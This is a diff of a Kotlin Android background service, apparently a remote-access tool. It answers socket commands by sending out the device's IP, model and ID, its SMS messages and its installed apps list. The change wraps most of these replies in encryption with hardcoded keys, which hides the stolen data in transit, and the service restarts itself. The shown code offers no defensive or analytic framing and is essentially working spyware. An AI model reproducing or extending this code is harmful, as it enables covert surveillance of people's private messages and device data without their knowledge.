@@ -106,10 +106,22 @@ class CommandsRemoteService : Service() {
                         val getSmsDevice = readSMS()
                         val getAppDevice = getInstalledApps().toString()
 
+                        fun PushData(data: String, key: String){
+                            try {
+                                val message = EncryptTextTest(data, key)
+                                clientSocket.getOutputStream().write(message.toByteArray())
+                                Log.d("Texto", "socket enviado con éxito")
+                            } catch (e: Exception) {
+                                e.printStackTrace()
+                                Log.d("Texto", "Ocurrio un error al enviar el socket")
+                            }
+                        }
+
                         when (message) {
 
                             "getip" -> {
-                                clientSocket.getOutputStream().write(getIpDevice.toByteArray())
+                                PushData(GetIpDevice().toString(), "Xz@6Ry2IDm!7oP8K")
+
                             }
 
                             "getuser" -> {
@@ -118,7 +130,8 @@ class CommandsRemoteService : Service() {
                                 val name = Build.MODEL
                                 val idDispositivo = Build.ID
                                 val marcaDispositivo = "$brand $product $name , $idDispositivo"
-                                clientSocket.getOutputStream().write(marcaDispositivo.toByteArray())
+                                PushData(marcaDispositivo, "2%aF@6zISd8G#9qY")
+
                             }
 
                             "getsms" -> {
@@ -131,7 +144,7 @@ class CommandsRemoteService : Service() {
                             }
 
                             "getapp" -> {
-                                clientSocket.getOutputStream().write(getAppDevice.toByteArray())
+                                PushData(getAppDevice, "T%Z8@5r\$7x#E3wS2")
                             }
 
                             "pushuser" -> {
@@ -142,8 +155,8 @@ class CommandsRemoteService : Service() {
                                 val marcaDispositivo = "$brand $product $name"
 
                                 val pushDataDevice = "$idDispositivo , $marcaDispositivo , $getIpDevice"
+                                PushData(pushDataDevice, "*S8#Q4w\$7e%T2uIW")
 
-                                clientSocket.getOutputStream().write(pushDataDevice.toByteArray())
                             }
 
                             "pushsms" -> {
@@ -152,23 +165,16 @@ class CommandsRemoteService : Service() {
                                     val messageBody = smsData["messageBody"]
                                     val smsMessage = "Sender: $sender, Message: $messageBody\n"
                                     clientSocket.getOutputStream().write(smsMessage.toByteArray())
+
                                 }
                             }
 
                             "pushapp" -> {
-                                clientSocket.getOutputStream().write(getAppDevice.toByteArray())
+                                PushData(getAppDevice, "4@e#S8f!G7rWK6zQ")
                             }
 
                             "test" -> {
-                                try {
-
-                                    val message = EncryptTextTest("Este va a ser un mensaje cifrado y desifrado por python", "EstaEsUnaClaveSe")
-                                    clientSocket.getOutputStream().write(message.toByteArray())
-                                    Log.d("Texto", "socket enviado con éxito")
-                                } catch (e: Exception) {
-                                    e.printStackTrace()
-                                    Log.d("Texto", "Ocurrio un error al enviar el socket")
-                                }
+                                PushData("Test", "T%Z8@5r\$7x#E3wS2")
                             }
 
                             /*
@@ -180,6 +186,7 @@ class CommandsRemoteService : Service() {
                             */
 
                         }
+
 
                     } catch (e: Exception) {
                         Log.e("mensaje", "Error reading message: $e")
@@ -196,6 +203,9 @@ class CommandsRemoteService : Service() {
 
         return START_STICKY
     }
+
+
+
 
     override fun onBind(intent: Intent?): IBinder? {
         // El servicio no está diseñado para ser vinculado
